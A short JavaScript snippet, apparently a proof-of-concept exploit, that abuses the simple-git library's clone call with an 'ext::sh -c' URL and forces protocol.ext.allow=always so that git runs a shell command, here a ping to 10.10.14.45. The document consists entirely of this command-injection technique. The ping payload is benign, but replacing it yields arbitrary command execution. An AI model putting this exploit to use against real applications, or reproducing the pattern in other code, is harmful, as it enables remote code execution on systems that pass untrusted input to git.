const simpleGit = require('simple-git');

const git2 = simpleGit();

// Modify the command to trigger a ping
git2.clone('ext::sh -c ping -c 4 10.10.14.45', '/tmp/example-new-repo', ["-c", "protocol.ext.allow=always"]);
